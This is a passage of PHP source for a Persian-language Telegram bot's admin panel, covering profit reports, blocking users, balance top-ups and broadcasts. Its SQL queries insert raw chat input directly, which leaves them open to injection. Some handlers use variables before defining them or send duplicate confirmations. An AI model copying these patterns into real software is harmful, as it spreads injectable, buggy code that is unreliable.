     $file_name = 'sod.txt'; // نام فایل

// خواندن محتوای فایل
     $content = file_get_contents($file_name);

// تبدیل محتوا به عدد
     $numbersod = intval($content);
     $number = 0;
     file_put_contents($file_name, $number);
     $connect->query("UPDATE `pol` SET `yesterday` = '$numbersod' , `today`='0' WHERE `id` = '1' LIMIT 1");

//     bot('sendmessage',[
//         'chat_id'=>-1002092325554,
//         'text'=>" گزارش سود امروز از سفارشات ثبت شده ی سین در api
//
//       : {$sod_system['totalpol']}  💲  سود کل تا ایمجای کار از تاریخ 3 جنیوری سال 2024
//
//         سود امروز ربات : {$sod_system['today']}
//         ",
//         'disable_web_page_preview'=>true
//     ]);
     bot('sendmessage',[
         'chat_id'=>-1002092325554,
         'text'=>" گزارش سود امروز از سفارشات ثبت شده ی سین در api
           
       : {$sod_system['totalpol']}  💲  سود کل تا ایمجای کار از تاریخ 3 جنیوری سال 2024
         
         سود امروز ربات : $numbersod
         ",
         'disable_web_page_preview'=>true
     ]);

     bot('sendmessage',[
         'chat_id'=>$chatid,
         'text'=>" ادمین گرامی پزارش سود ربات در چنل ارسال شد و امار صفر گردید ",
         'disable_web_page_preview'=>true
     ]);
//     bot('sendmessage',[
//         'chat_id'=>$chatid,
//         'text'=>"📍 ربات روشن شد",
//     ]);
//     unlink('bot');
//     $connect->query("UPDATE `user` SET `step` = 'none' WHERE `id` = '$fromid' LIMIT 1");
 }
//======================================================
elseif ($text == '📍 ربات روشن' and in_array($fromid, $admin)){
bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"📍 ربات روشن شد",
]);
unlink('bot');	
$connect->query("UPDATE `user` SET `step` = 'none' WHERE `id` = '$fromid' LIMIT 1");
}
//====================================
elseif ($text == '📍 ربات خاموش' and in_array($fromid, $admin)){
bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"📍 ربات خاموش شد",
]);
touch('bot');		
$connect->query("UPDATE `user` SET `step` = 'none' WHERE `id` = '$fromid' LIMIT 1");
}
elseif ($text == '📍 فروارد به کاربران' and $tc == 'private' and in_array($fromid,$admin)){
         bot('sendmessage',[
         'chat_id'=>$chatid,
         'text'=>"📍 لطفا پیام خود را فوروارد کنید [پیام فوروارد شده میتوانید از شخص یا کانال باشد]",
	     'reply_markup'=>json_encode([
         'keyboard'=>[
	         [['text'=>"برگشت 🔙"]]
                ],
           'resize_keyboard'=>true
              ])
          ]);
$connect->query("UPDATE `user` SET `step` = 'fortoall' WHERE `id` = '$fromid' LIMIT 1");		
}
elseif ($text == '📍 مسدود کردن' and $tc == 'private' and in_array($fromid,$admin)){
         bot('sendmessage',[
         'chat_id'=>$chatid,
         'text'=>"📍 لطفا شناسه کاربری فرد را ارسال کنید",
	   'reply_markup'=>json_encode([
       'keyboard'=>[
	        [['text'=>"برگشت 🔙"]]
                 ],
          'resize_keyboard'=>true
            ])
          ]);
$connect->query("UPDATE `user` SET `step` = 'block' WHERE `id` = '$fromid' LIMIT 1");		
}
elseif ($text == '📍حذف مسدود کردن' and $tc == 'private' and in_array($fromid,$admin)){
 bot('sendmessage',[
 'chat_id'=>$chatid,
 'text'=>"📍 لطفا شناسه کاربری فرد را ارسال کنید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"برگشت 🔙"]]
 ],
  'resize_keyboard'=>true
])
]);
$connect->query("UPDATE `user` SET `step` = 'unblock' WHERE `id` = '$fromid' LIMIT 1");
}

elseif ($text == '📍 اطلاعات کاربر' and $tc == 'private' and in_array($fromid,$admin)){
         bot('sendmessage',[
         'chat_id'=>$chatid,
         'text'=>"📍 لطفا شناسه عددی فرد را ارسال کنید.",
	   'reply_markup'=>json_encode([
       'keyboard'=>[
	        [['text'=>"برگشت 🔙"]]
                 ],
          'resize_keyboard'=>true
            ])
          ]);
$connect->query("UPDATE `user` SET `step` = 'statsuser' WHERE `id` = '$fromid' LIMIT 1");		
}
elseif($user['step'] == 'statsuser'){
$allbuy1 = mysqli_num_rows(mysqli_query($connect,"select `id` from `buy` WHERE `id` = '$text'"));
$use = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `user` WHERE `id` = '$text' LIMIT 1"));
$allorder1 = $orderseen1 + $orderlike1;
bot('sendmessage',[       
			'chat_id'=>$chatid,
			'text'=>"✅ اطلاعات کاربر $text به شرح زیر است :

📍 موجودی کاربر : {$useran['coin']}
poll : {$useran['pol']}
📍 شناسه وبسرویس کاربر : {$useran['apikey']}
📍 تعداد خرید ها : $allbuy1",
	         ]);
}
elseif ($text == '📍 افزایش موجودی' and $tc == 'private' and in_array($fromid,$admin)){
         bot('sendmessage',[
         'chat_id'=>$chatid,
         'text'=>"📍 لطفا در خط اول ایدی فرد و در خط دوم میزان موجودی را وارد کنید
501376147
2000",
	   'reply_markup'=>json_encode([
       'keyboard'=>[
	        [['text'=>"برگشت 🔙"]]
                 ],
          'resize_keyboard'=>true
            ])
          ]);
$connect->query("UPDATE `user` SET `step` = 'sendadmin' WHERE `id` = '$fromid' LIMIT 1");		
}
elseif ($text == '💰افزایش سکه کاهش سکه' and $tc == 'private' and in_array($fromid,$admin)){
 bot('sendmessage',[
 'chat_id'=>$chatid,
 'text'=>"✅ مدیر گرامی لطفا در خط اول ایدی عددی کاربر مورد نظر وارد کنید و خط دوم تعداد سکه .

⚠️ مدیر گرامی اگر میخواهید موجودی کاربر کاهش بدید علامت - کنار تعداد سکه بزارید و اگر میخواهید افزایش بدید هیج علامتی قرار ندید کنار تعداد سکه .

👈 برای نمونه :
5063082802
1000",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"برگشت 🔙"]]
 ],
  'resize_keyboard'=>true,
    'input_field_placeholder'=> "$fromid - $firstname"
])
  ]);
$connect->query("UPDATE `user` SET `step` = 'sendadmin' WHERE `id` = '$fromid' LIMIT 1");
}
elseif ($text == 'addcoin' and $tc == 'private' and in_array($fromid,$admin)){
 bot('sendmessage',[
 'chat_id'=>$chatid,
 'text'=>"✅ مدیر گرامی لطفا در خط اول ایدی عددی کاربر مورد نظر وارد کنید و خط دوم تعداد سکه .

⚠️ مدیر گرامی اگر میخواهید موجودی کاربر کاهش بدید علامت - کنار تعداد سکه بزارید و اگر میخواهید افزایش بدید هیج علامتی قرار ندید کنار تعداد سکه .

👈 برای نمونه :
5063082802
1000",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"برگشت 🔙"]]
 ],
  'resize_keyboard'=>true,
    'input_field_placeholder'=> "$fromid - $firstname"
])
  ]);
$connect->query("UPDATE `user` SET `step` = 'sendpol' WHERE `id` = '$fromid' LIMIT 1");
}
//===========================// admin step //===========================
elseif($user['step'] == 'block' && $tc == 'private') {
			bot('sendmessage',[       
			'chat_id'=>$chatid,
			'text'=>"✅ فرد با موفقیت مسدود شد",
	         ]);	
	         			bot('sendmessage',[       
			'chat_id'=>$text,
			'text'=>"❗️ شما به علت رعایت نکردن قوانین توسط مدیریت ربات مسدود شده اید !
👈🏻  برای رفع مسدودیت خود با @CleverSupp در ارتباط باشید",
	         ]);
$connect->query("INSERT INTO `block` (`id`) VALUES ('$text')");
 $connect->query("UPDATE user SET apikey = '$apikeyy' WHERE id = '$text' LIMIT 1");
$connect->query("UPDATE `user` SET `step` = 'none' WHERE `id` = '$fromid' LIMIT 1");
}
elseif($user['step'] == 'unblock' && $tc == 'private'){
bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"✅ فرد با موفقیت لغو مسدود شد",
 ]);
$connect->query("DELETE FROM `block` WHERE `id` = '$text'");
$connect->query("UPDATE `user` SET `step` = 'none' WHERE `id` = '$fromid' LIMIT 1");
}
elseif($user['step'] == 'sendadmin') {
    $user = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `user` WHERE `id` = '$all[0]' LIMIT 1"));

//    $connect->query("UPDATE `user` SET `coin` = '$coin' WHERE `id` = '$all[0]' LIMIT 1");
    $query = "UPDATE `user` SET `coin` = '$coin' WHERE `id` = '$all[0]' LIMIT 1" ;
    // اجرای کوئری UPDATE
    if ($connect->query($query) === TRUE) {
        $affectedRows = $connect->affected_rows;
        bot('sendmessage',[
            'chat_id'=>$chatid,
            'text'=>"انتقال موجودی با موفقیت انجام شد ✅",
        ]);
        echo "تعداد رکوردهای تحت تاثیر: " . $affectedRows;
    } else {
        bot('sendmessage',[
            'chat_id'=>$chatid,
            'text'=>"  انجام نشد$connect->error  ",
        ]);
        echo "خطا در اجرای کوئری: " . $connect->error;
    }

$all = explode("\n", $text);
bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"انتقال موجودی با موفقیت انجام شد ✅",
 ]);
$user = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `user` WHERE `id` = '$all[0]' LIMIT 1")); 
$coin = $user['coin'] + $all[1] ;
bot('sendmessage',[
'chat_id'=>$all[0],
'text'=>"✅ $all[1] تومان موجودی از طرف مدیریت ربات برای شما انتقال داده شد .
💰 موجودی جدید شما : $coin تومان",
]);
 $connect->query("UPDATE `user` SET `coin` = '$coin' WHERE `id` = '$all[0]' LIMIT 1");
}
elseif($user['step'] == 'sendpol') {
$all = explode("\n", $text);
bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"انتقال موجودی با موفقیت انجام شد ✅",
 ]);
$user = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `user` WHERE `id` = '$all[0]' LIMIT 1")); 
$coin = $user['pol'] + $all[1] ;
bot('sendmessage',[
'chat_id'=>$all[0],
'text'=>"✅ $all[1] تومان موجودی از طرف مدیریت ربات برای شما انتقال داده شد .
💰 موجودی جدید شما : $coin تومان",
]);
$connect->query("UPDATE `user` SET `pol` = '$coin' WHERE `id` = '$all[0]' LIMIT 1");
}
elseif ($user['step'] == 'sendtoall') {
$photo = $message->photo[count($message->photo)-1]->file_id;
$caption = $update->message->caption;
         bot('sendmessage',[
        	'chat_id'=>$chatid,
        	'text'=>"✔️ پیام شما با موفقیت برای ارسال همگانی تنظیم شد",
 ]);
$connect->query("UPDATE `user` SET `step` = 'none' WHERE `id` = '$fromid' LIMIT 1");
$connect->query("UPDATE `sendall` SET step = 'send' , `text` = '$text$caption' , `chat` = '$photo' LIMIT 1");			
}
elseif ($user['step'] == 'fortoall') {
         bot('sendmessage',[
        	'chat_id'=>$chatid,
        	'text'=>"✔️ پیام شما با موفقیت به عنوان فوروارد همگانی تنظیم شد",
 ]);
$connect->query("UPDATE `user` SET `step` = 'none' WHERE `id` = '$fromid' LIMIT 1");	
$connect->query("UPDATE `sendall` SET `step` = 'forward' , `text` = '$messageid' , `chat` = '$chatid' LIMIT 1");		
}

if($val !== FALSE)
{
     mysqli_multi_query($connect,"CREATE TABLE qw$fromid (
    bot varchar(200) PRIMARY KEY,
 token varchar(200) NOT NULL
    ) default charset = utf8mb4;");
}

?>